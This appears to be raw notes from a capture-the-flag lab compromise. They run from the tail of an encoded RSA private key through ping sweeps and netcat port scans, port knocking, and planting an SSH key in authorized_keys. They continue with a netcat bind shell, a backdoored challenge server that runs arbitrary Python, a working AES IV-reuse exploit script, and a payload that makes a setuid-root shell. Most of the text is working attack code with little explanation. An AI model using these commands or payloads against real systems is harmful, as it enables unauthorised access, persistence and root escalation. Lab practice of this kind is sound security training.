TdCZzRpem01YlgrQXJWL3ltTE9reWJLOGNoejVmcnlYY2plVjFxCml6SmUyQVhaazEvOGhZODB0dkpXanhVRWZuZ3V5b296UWY1VDc0bW41YWV6OUpnR1dNcXpwZkt3WjZMeDVjVGcKWnUrbStyeWFrQlBGalV0dDA0bENZQ0NLV1F6UGhnSXI1eFVGeDYyaENHaGg2Vzh0U0lCNms3SHB1bjEyM0dRMAp1VCtSMEVyWUE1R2R5eDQ0RlpFYXRaM3JYQ3BWbUpsbENUV1VxQnVhSFlBdGNaVGhUVFpmeFJGSHkwMklUNkZXClBMQ1ovWE4yRStUZHRrWG1GY1RYUnNndHlBLzVWWHNUV1dtUmNIY3p2NWc1WWNRM3BIczNNaFN4c1dTZFR6LzgKUll6bXhPbkNqWldYYVVlMFhiN0ZqQS9ldm1wWHN5aENoR2J2cDBLMGhaRmNNZXN6RkthOEs0cEFlZGN5RzMxbgo0K0hoSW1uRXBMWlFPWGhmWGxrS01RWHJCeXM3aGtvbmtEcDU3VnFoK0lJWkxHelZtZlRWRWoyV2hjLzBZK0dJCkRNcGgwWnZURytKZ3YxTE8zU2w4MlJ6bTFqVWt6RUlaTkl4WWVTR3JaZjZDaFZMUGE4NWF4cXc1RVZOQ3hZVWcKSkFxZyt1ZDZ4SU85b2JpZHh6STJyTGZieGNwTXVyODBuYjRjcllNTm0wOXlQUWFza25nSy80SWptblBMZVRpaAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=")

        elif score >= 120 and current >= 30:
                cSock.send("\nScore: " + str(score) + "\n")
                cSock.send("Time: %.2f " % current + "secs\n")
                cSock.send("Enough points, but too slow\n")

        else:
                cSock.send("\nScore: " + str(score) + "\n")
                cSock.send("Time: %.2f " % current + "secs\n")
                cSock.send("Just a bit embarrasing really...\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

s.bind(("0.0.0.0", 4444))
s.listen(10)

cSock, addr = s.accept()
handler(cSock, addr)







#!/bin/bash
TF=$(mktemp -u)
touch $TF
is_alive_ping()
{
  ping -c 1 $1 > /dev/null
  [ $? -eq 0 ] && echo Node with IP: $i is up. >> $TF
}

for i in 192.168.4.{1..254} 
do
is_alive_ping $i & disown
done
sleep 1
cat $TF
rm $TF



 for i in $(seq 1 65535); do nc -z -v 192.168.4.100 $i 2>&1 | grep 'open'; done
nc -z 192.168.4.100 7000 8000 9000;


Return-path: <locke@192.168.4.100>
Received: from locke by 192.168.4.100 with local (Exim 4.80)
~       (envelope-from <locke@adm>)
~       id 1XHczw-0000V2-8y
~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100

Date: Wed, 13 Aug 2014 19:10:08 +0100
To: terra@192.168.3.50
Subject: Port Knock
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: <E1XHczw-0000V2-8y@adm>
From: locke@192.168.4.100
~
Hi Terra,

I've been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
Let me know how it goes.

Regards,
Locke



knock port

nc -z 192.168.4.100 7000 8000 9000;




echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJ6RfCFyxxJLNPe/Dn94vaHUFvnm8Qg44CRCkhBD+V2fJPpi3DR0Bo3vUmJ2N+iPO91plE2tFjnCR0dSva33dMnHy8oNn6fm6nicIqV7enazPaEo8OE/su/GRVMzsijeqgBhd5+CBM5a9+grxfylcTfEB0jIXi4JeYON6DpQqgKvleJY/XZhAQ4Mt362n1EfhH+sJp6dyw2y1rjmxjU1e1a4mN7gdWQ9Xx6LThx7xI/k/BWFWx+nYfGvyDggqftlPC2aQPVK6+ZmjIMc0CxOioW3ZGJUT3ItCP3gZxqDHs+pSKN4dv7hP7q24Nm2OBy3hF1hl6OdQ5jH6IeJKOXrEJ terra@dev2" > /home/locke/.ssh/authorized_keys




Nk9yY31hva8q
Nk9yY31hva8q

OrcWQi5VhfCo

5224XbG5ki2C


locke@adm:~$ cat note.txt 
Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.



locke@adm:~$ cat littleShell.sh
#!/bin/sh

/bin/nc -lnp 1111 -e '/bin/sh



diskimage.tar.gz


f0393ef3bca5e2b1cd0da7c4


```python

#!/usr/bin/env python

import socket, thread, random, subprocess, os
from Crypto.Cipher import AES
from encodings import hex_codec

iv_size = 6
key = os.urandom(16)

def reset_key(sock):
        key = os.urandom(16)

def gen_iv():
        iv_nibbles = os.urandom(iv_size).encode("hex")[0:iv_size]
        iv_total = iv_nibbles+"1"*(32-len(iv_nibbles))
        return iv_total.decode("hex")

def encrypt(iv, data):
        pad_bytes = 16-(len(data) % 16)

        if pad_bytes < 16 and pad_bytes > 0:
                data = data + "X"*pad_bytes

        aes = AES.new(key, AES.MODE_OFB, iv)
        ciphertext = aes.encrypt(data)
        if pad_bytes < 16:
                ciphertext = ciphertext[0:-pad_bytes]

        return ciphertext

def banner(sock):
        sock.send("=============================\nCan you retrieve my secret..?\n=============================\n\nUsage:\n'V' to view the encrypted flag\n'E' to encrypt a plaintext string (e.g. 'E AAAA')\n\n")

def handler(sock, addr):

        reset_key(sock)
        banner(sock)

        f = sock.makefile()
        cmd = f.readline()

        while len(cmd) != 0:
                cmd = cmd.strip()
                if len(cmd) == 0:
                        sock.send("Need a Command...\n")
                        break
                iv = gen_iv()

                if cmd[0] == "V":
                        ciphertext = encrypt(iv, "0W6U6vwG4W1V")
                        sock.send(iv.encode("hex")[0:iv_size] + ":" + ciphertext.encode("hex") + "\n")
                        reset_key(sock)
                        cmd = f.readline()
                        continue

                elif cmd[0] == "E":
                        segs = cmd.split()
                        if len(segs) != 2 or len(segs[1]) < 1:
                                sock.send("Invalid Syntax\n")

                        else:
                                ciphertext = encrypt(iv, segs[1])
                                sock.send(iv.encode("hex")[0:iv_size] + ":" + ciphertext.encode("hex") + "\n")

                        cmd = f.readline()
                        continue

                elif cmd == "0W6U6vwG4W1V":
                        while True:
                                sock.send("> ")
                                cmd2 = sock.recv(256)
                                p = subprocess.Popen(['/usr/bin/python', '-c', cmd2], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                                p1 = p.communicate()[0]
                                sock.send(p1)
                        done

                        cmd = f.readline()
                        continue

                else:
                        sock.send("Invalid Command\n")
                        break

        f.close()
        sock.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

s.bind(("127.0.0.1", 1234))
s.listen(1)

sock, addr = s.accept()
handler(sock, addr)


```


```python


#!/usr/bin/python

from socket import *
from time import *

host = "127.0.0.1"
port = int(1234)

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))

keepgoing = 1
# banner
print s.recv(256)

lookup = {}  # we are going to build a lookup table for the IV and encrypted secret. 

# this challenge lets us view the encrypted secret and lets us encrypt a message ourselves.
# in doing so, it shows "IV:encrypted message". we'll do a stream cipher re-use style attack.
# we'll build a lookup table with encrypted secret & the corresponding IV
# and if we encounter the same IV for our message, then we can xor the encrypted flag, 
# encrypted message and plaintext message to get the flag (or actually, the secret salt)

while keepgoing:
  s.send("V\n")    # request the encrypted secret
  encryptedKey = s.recv(256).strip()    # grab it
  parts = encryptedKey.split(":")   # split & store
  lookup[parts[0]] = parts[1]  

  s.send("E "+"\xFF"*12 + "\n")  # ask to encrypt this message (12 x "0xFF", easy to reverse)
  response = s.recv(256).strip()    # grab response

  parts = response.split(":")       # split it
  if parts[0] in lookup.keys():   # check if the IV is already seen before
      k1 = int(parts[1], 16)      # JACKPOT! convert string to hex
      k2 = int(lookup[parts[0]], 16)   # convert string to hex
      d1 = k1 ^ k2 # xor the encrypted secret & encrypted message
      d2 = d1 ^ 0xffffffffffffffffffffffff    # xor with plaintext "message"
      key = hex(d2)[2:-1] # output of hex() is "0x...L", but .decode() doesn't want those chars
      print key                 # debug output...
      print key.decode("hex")  # output decrypted secret!!
      keepgoing = 0 # stop the loop. we're done!
s.close() # close socket. be nice.


```


import os; os.system('cp /bin/sh /home/kefka/sh');   os.system('chown root.root /home/kefka/sh'); os.system('chmod 4755 /home/kefka/sh');

for i in $(seq 1 65535);do nc -v -z 192.168.4.100 $i 2>&1 | grep 'open'; done

for i in 7000 8000 9000;do nc -v -z 192.168.4.100 $i ; done
